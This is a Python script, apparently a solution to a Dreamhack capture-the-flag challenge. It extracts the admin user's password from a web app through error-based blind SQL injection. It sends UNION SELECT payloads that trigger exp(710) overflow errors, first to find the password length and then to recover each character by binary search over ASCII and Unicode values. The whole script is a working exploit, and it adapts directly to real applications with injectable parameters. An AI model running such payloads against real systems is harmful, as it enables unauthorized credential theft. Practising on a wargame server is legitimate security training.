import requests
from tqdm import tqdm

# 1. 환경 설정 (실제 값으로 수정)
url = "http://host8.dreamhack.games:15513/" 
pw_length = 0
result = ""

#upw 길이구하기
for i in tqdm(range(1,200)):
    data = {'uid':f"' union select 1,2,(if((select char_length(upw) from users where uid='admin')={i},1,exp(710)));--"}
    req = requests.get(url,params=data)
    
    if req.status_code == 200:
        pw_length = i
        print(f"pw_length is {pw_length}")
        break

for _ in range(1, pw_length + 1):
    tmp = 128
    data = {"uid":f"' union select 1,2,(if((select ord(substr(upw,{_},1)) from users where uid='admin')<{tmp},1,exp(710)));--"}
    req = requests.get(url,params=data)

    if req.status_code == 200:
        low, high = 0, 127
        print(f"{_}번째 ASCII 탐색중")
    else:
        low, high = 128, 16000000
        print(f"{_}번째 UNICODE 탐색중")

    charcode = 0

    while low <= high: #이진탐색 알고리즘
        mid = (low + high) // 2
        params = {"uid":f"' union select 1,2,(if((select ord(substr(upw,{_},1)) from users where uid='admin')<{mid},1,exp(710)));--"}
        res = requests.get(url,params=params)

        if res.status_code == 200:
            charcode = mid
            high = mid - 1
        else:
            low = mid + 1

    found_char_val = charcode - 1

# found_char_val이 ASCII라면 chr, UNICODE라면 약간의 공정이 필요함
    try:
        found_char = chr(found_char_val)
    except:
        hex_val = hex(found_char_val)[2:] #앞의 0x 제거
        
        # fromhex()의 규칙(1바이트씩 해석)때문에 길이가 짝수가 아니면 앞에 0추가
        if len(hex_val) % 2 != 0: 
            hex_val = '0' + hex_val

        found_char = bytes.fromhex(hex_val).decode('utf-8')
    
    result += found_char

    print(f"found : {found_char}")

print(f"최종 비밀번호 : {result}")